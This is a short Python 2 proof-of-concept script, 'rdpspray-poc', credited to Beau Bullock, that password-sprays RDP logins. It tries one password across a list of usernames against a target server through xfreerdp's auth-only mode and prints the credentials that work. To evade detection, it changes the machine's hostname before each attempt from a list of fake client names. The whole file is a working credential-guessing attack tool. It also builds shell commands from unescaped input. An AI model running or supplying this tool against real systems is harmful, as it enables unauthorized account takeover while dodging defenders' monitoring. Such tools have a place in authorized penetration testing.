#!/usr/bin/python

#Written by Beau Bullock (@dafthack)

import getopt, sys, subprocess

def help():
	print """
	Usage: rdpspray-poc [options]"
	\t-l: user list to password spray
	\t-c: client list of hostnames to rotate through for each request
	\t-p: password
	\t-d: domain
	\t-t: target RDP server
	"""
try:
	opts, args = getopt.getopt(sys.argv[1:], "l:c:p:d:t:")
except getopt.GetoptError:
	help()
for opt, arg in opts:
	if opt == "-h":
		help()
		sys.exit()
	elif opt == "-l":
		userlist = arg
	elif opt == "-c":
		clientlist = arg
	elif opt == "-p":
		password = arg
	elif opt == "-d":
		domain = arg
	elif opt == "-t":
		target = arg

#Read username list to spray against
with open(userlist) as f:
	usernames = f.readlines()
usernamesstripped = [x.strip() for x in usernames]

#Read hostnames to be used to send to the server. 
with open(clientlist) as g:
	hostnames = g.readlines()
hostnamesstripped = [x.strip() for x in hostnames]

i = 0
k = 0
#This is the max index item for the hostname list so in the event the hostname list
#has a smaller number of hosts than the userlist it will start looping back through
#from the first host in the list.
l = len(hostnamesstripped) - 1

#Get original hostname to change back to after running
p = subprocess.Popen('hostname', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
for line in p.stdout.readlines():
	orighostname = line.strip()

#These are the error codes to compare with xFreeRDP output to determine success or failure
logonfailed = "ERRCONNECT_LOGON_FAILURE"
logonsuccess_nordp = "Authentication only, exit status 1"
logonsuccess_allowed = "Authentication only, exit status 0"
status = None

total_accounts = len(usernamesstripped)
print "Total number of users: " + str(total_accounts)
print "Password spraying has now started... please sit tight."

#Now using xFreeRDP to spray accounts
for i in range(total_accounts):
	subprocess.call("hostnamectl set-hostname '%s'" % hostnamesstripped[k], shell=True)	
	proc = subprocess.Popen("xfreerdp /v:'%s' +auth-only /d:%s /u:%s /p:%s /sec:nla /cert-ignore" % (target, domain, usernamesstripped[i], password), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	output = proc.stderr.read()
	if logonfailed in output:
		status = "invalid"
	elif logonsuccess_nordp in output:
		status = "valid_no_rdp"		
		print "Cred probably valid but not allowed to RDP: " + usernamesstripped[i] + ":" +password
	elif logonsuccess_allowed in output:
		status = "success"
		print "Cred successful: " + usernamesstripped[i] + ":" + password
	
	if k < l:
		k +=1
	else:
		k = 0

#Reset hostname back to the original after completing the spray
subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
